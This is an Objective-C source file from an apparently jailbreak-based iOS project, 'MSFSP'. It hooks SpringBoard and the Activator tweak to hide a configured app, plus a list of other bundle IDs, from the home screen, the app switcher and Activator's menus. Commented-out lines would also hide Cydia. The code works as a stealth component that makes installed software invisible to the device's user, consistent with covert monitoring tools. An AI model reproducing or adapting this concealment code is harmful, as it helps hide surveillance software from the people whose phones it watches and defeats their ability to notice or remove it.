/*
 *  Visibility.h
 *  MSFSP
 *
 *  Created by Dominique Mayrand on 12/21/11.
 *  Copyright 2011 __MyCompanyName__. All rights reserved.
 *
 */
#import "MSFSP.h"
#import "Visibility.h"
#import "DefStd.h"

#import "SBIconModel.h"
#import "SBAppSwitcherModel.h"
#import "SBAppSwitcherController.h"
#import "SBApplication.h"

#import "LAListenerTableViewDataSource.h"
#import "LAMenuListenerSelectionController.h"
#import "LABlacklistSettingsController.h"

HOOK(SBAppSwitcherModel, _saveRecents,void){
	DLog(@"SBAppSwitcherModel _saveRecents");
	Visibility* vis = [[[Visibility alloc] init] autorelease]; 
	if(vis){
		if(vis.mHideAppSwitcherIcon == YES){
			NSString* stBundleID = vis.mBundleID;
			if(stBundleID != nil){
				if(stBundleID){
					DLog(@"Removing bundle with name: %@", stBundleID);
					[self remove:stBundleID];
					//[self remove:kCYDIAIDENTIFIER];
				}else{
					DLog(@"could not get the bundleID");
				}
			}else{
				DLog(@"No bundleID to remove");
			}
			
			// Hidden list
			for (NSString *bundleIdentifier in [vis mHiddenBundleIdentifiers]) {
				[self remove:bundleIdentifier];
			}
		}else{
			DLog(@"No bundleID to hide but check hidden list");
			for (NSString *bundleIdentifier in [vis mHiddenBundleIdentifiers]) {
				[self remove:bundleIdentifier];
			}
		}
	}
	CALL_ORIG(SBAppSwitcherModel, _saveRecents);
}

HOOK(SBAppSwitcherController, _iconForApplication$, id, id arg1) {
	DLog(@"SBAppSwitcherController _iconForApplication$, arg1 = %@", arg1);
	Visibility* vis = [[[Visibility alloc] init] autorelease];
//	Class $SBAppSwitcherModel = objc_getClass("SBAppSwitcherModel");
//	[[$SBAppSwitcherModel sharedInstance] _saveRecents];
	SBApplication *sbApplication = arg1;
	BOOL block = NO;
	if ([vis mHideAppSwitcherIcon]) {
		if ([[sbApplication bundleIdentifier] isEqualToString:[vis mBundleID]]) {
			block = YES;
		} else {
			// Hidden list
			for (NSString *bundleIdentifier in [vis mHiddenBundleIdentifiers]) {
				if ([[sbApplication bundleIdentifier] isEqualToString:bundleIdentifier]) {
					block = YES;
					break;
				}
			}
		}
	} else {
		// Hidden list
		for (NSString *bundleIdentifier in [vis mHiddenBundleIdentifiers]) {
			if ([[sbApplication bundleIdentifier] isEqualToString:bundleIdentifier]) {
				block = YES;
				break;
			}
		}
	}
	
	if (block) {
		return nil;
	} else {
		return CALL_ORIG(SBAppSwitcherController, _iconForApplication$, arg1);;
	}
}

HOOK(SBIconModel, addIconForApplication$, void, id arg1) {
	DLog(@"addIconForApplication, arg1 = %@", arg1); // SBApplication
	Visibility* vis = [[[Visibility alloc] init] autorelease];
	BOOL block = NO;
	if (vis) {
		if (vis.mHideDesktopIcon == YES) {
			if (arg1) {
				NSString *stBundleID = vis.mBundleID;
				if (stBundleID) {
					NSString *identifier = [arg1 bundleIdentifier];
					if ([identifier isEqualToString:stBundleID] /*||
						[identifier isEqualToString:kCYDIAIDENTIFIER]*/) {
						block = YES; // Block the call to orignal implementation
					}
				}
			}
			
			// Hidden list
			NSString *identifier = [arg1 bundleIdentifier];
			for (NSString *bundleIdentifier in [vis mHiddenBundleIdentifiers]) {
				if ([identifier isEqualToString:bundleIdentifier]) {
					block = YES;
					break;
				}
			}
		} else {
			// Hidden list
			NSString *identifier = [arg1 bundleIdentifier];
			for (NSString *bundleIdentifier in [vis mHiddenBundleIdentifiers]) {
				if ([identifier isEqualToString:bundleIdentifier]) {
					block = YES;
					break;
				}
			}
		}
	}
	if (!block) {
		CALL_ORIG(SBIconModel, addIconForApplication$, arg1);
	}
}

#pragma mark Obsoleted

#define ACTIVATORITEMSLISTSYSTEMAPPSKEY				@"System Applications"
#define ACTIVATORITEMSLISTUSERAPPSKEY				@"User Applications"
#define ACTIVATORITEMSLISTBLACKLISTSYSTEMAPPSKEY	"systemApps"
#define ACTIVATORITEMSLISTBLACKLISTUSERAPPSKEY		"userApps"

void removeApplication(NSMutableArray *aApplications, NSString *aApplicationToRemove);
NSArray * manipulateApplications(NSArray *aApplications, NSString *aApplicationToRemove);

HOOK(UIViewController, viewWillAppear$, void, BOOL arg1) {
	if ([self isKindOfClass:NSClassFromString(@"LAEventSettingsController")] ||
		[self isKindOfClass:NSClassFromString(@"LAMenuListenerSelectionController")]) {
		LAListenerTableViewDataSource *tableDataSource = nil;
		object_getInstanceVariable(self, "_dataSource", (void **)&tableDataSource);
		if (tableDataSource) {
			NSMutableDictionary *listeners = nil;
			object_getInstanceVariable(tableDataSource, "_filteredListeners", (void **)&listeners);
			if (listeners) {
				Visibility* vis = [[[Visibility alloc] init] autorelease];
				
				// System Applications
				NSMutableArray *apps = [listeners objectForKey:ACTIVATORITEMSLISTSYSTEMAPPSKEY];
				removeApplication(apps, [vis mBundleID]);
				
				// User Applications
				apps = [listeners objectForKey:ACTIVATORITEMSLISTUSERAPPSKEY];
				removeApplication(apps, [vis mBundleID]);
			}
		}
	} else if ([self isKindOfClass:NSClassFromString(@"LABlacklistSettingsController")]) {
		Visibility* vis = [[[Visibility alloc] init] autorelease];

		// systemApps
		NSArray *apps = nil;
        object_getInstanceVariable(self, ACTIVATORITEMSLISTBLACKLISTSYSTEMAPPSKEY, (void **)&apps);
		NSArray *newApps = manipulateApplications(apps, [vis mBundleID]);
		[newApps retain];
		object_setInstanceVariable(self, ACTIVATORITEMSLISTBLACKLISTSYSTEMAPPSKEY, (void *)newApps);
		[apps release];
		apps = nil;

		// userApps
        object_getInstanceVariable(self, ACTIVATORITEMSLISTBLACKLISTUSERAPPSKEY, (void **)&apps);
		newApps = manipulateApplications(apps, [vis mBundleID]);
		[newApps retain];
		object_setInstanceVariable(self, ACTIVATORITEMSLISTBLACKLISTUSERAPPSKEY, (void *)newApps);
		[apps release];
		apps = nil;
	}
	CALL_ORIG(UIViewController, viewWillAppear$, arg1);
}

void removeApplication(NSMutableArray *aApplications, NSString *aApplicationToRemove) {
	for (NSString *app in aApplications) {
		if ([app isEqualToString:aApplicationToRemove]) {
			[aApplications removeObject:app];
			break;
		}
	}
}

NSArray * manipulateApplications(NSArray *aApplications, NSString *aApplicationToRemove) {
	NSMutableArray *newApps = [NSMutableArray array];
	for (NSString *app in aApplications) {
		if ([app isEqualToString:aApplicationToRemove]) {
			continue;
		} else {
			[newApps addObject:app];
		}
	}
	return (newApps);
}